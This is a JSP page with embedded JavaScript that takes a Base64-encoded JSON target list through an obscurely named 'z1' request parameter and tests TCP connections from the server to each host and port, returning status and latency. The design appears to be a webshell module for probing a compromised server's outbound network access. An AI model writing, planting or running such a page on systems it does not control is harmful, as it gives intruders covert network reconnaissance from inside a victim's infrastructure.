<%

(function() {
    var InetSocketAddress = Java.type("java.net.InetSocketAddress");
    var Socket = Java.type("java.net.Socket");
    var Base64 = Java.type("java.util.Base64");
    var ArrayList = Java.type("java.util.ArrayList");

    function execute_egress_test(targets) {
        var results = [];

        for (var i = 0; i < targets.length; i++) {
            var target = targets[i];
            if (!target) continue;
            target = target.trim();
            if (target === "") continue;

            var parts = target.split(":");
            var host = parts[0];
            var port = 80;
            if (parts.length > 1) {
                try {
                    port = parseInt(parts[1], 10);
                } catch (e) {
                    port = 80;
                }
            }

            var status = "closed";
            var reason = "Connection timeout or filtered";
            var latency = 0;
            var protocol = (port === 443 ? "HTTPS/TCP" : (port === 53 ? "DNS/UDP-TCP" : "TCP"));

            var startTime = java.lang.System.nanoTime();
            var socket = null;

            try {
                socket = new Socket();
                socket.connect(new InetSocketAddress(host, port), 1500);
                var endTime = java.lang.System.nanoTime();
                latency = Math.round((endTime - startTime) / 1000000.0 * 100.0) / 100.0;
                status = "open";
                reason = "Connected successfully";
            } catch (e) {
                reason = e.getMessage() ? e.getMessage() : "Connection timeout or filtered";
            } finally {
                if (socket != null) {
                    try {
                        socket.close();
                    } catch (ignore) {}
                }
            }

            var row = {};
            row["target"] = target;
            row["status"] = status;
            row["protocol"] = protocol;
            row["latency"] = latency;
            row["reason"] = reason;
            results.push(row);
        }

        return results;
    }

    function main() {
        var z1Param = request.getParameter("z1");
        if (!z1Param) {
            out.print(JSON.stringify([{ "target": "ERROR", "status": "closed", "protocol": "TCP", "latency": 0, "reason": "Missing parameter z1" }]));
            return;
        }

        try {
            var decodedBytes = Base64.getDecoder().decode(z1Param);
            var jsonStr = new java.lang.String(decodedBytes, "UTF-8");
            var config = JSON.parse(jsonStr);

            var targets = [];
            if (config && config.targets && Array.isArray(config.targets)) {
                targets = config.targets;
            }

            if (targets.length === 0) {
                targets.push("8.8.8.8:53");
            }

            var responseData = execute_egress_test(targets);
            out.print(JSON.stringify(responseData));
        } catch (e) {
            out.print(JSON.stringify([{ "target": "ERROR", "status": "closed", "protocol": "TCP", "latency": 0, "reason": "Invalid JSON / Base64." }]));
        }
    }

    main();
})();

%>